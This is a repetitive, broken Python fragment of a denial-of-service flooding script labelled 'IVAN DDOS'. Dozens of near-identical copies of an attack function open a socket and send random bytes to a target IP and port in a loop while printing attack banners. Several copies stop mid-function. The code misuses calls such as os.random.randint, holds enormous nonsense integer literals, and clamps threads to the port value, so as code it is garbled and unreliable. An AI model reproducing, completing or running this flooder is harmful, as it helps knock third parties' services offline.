        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
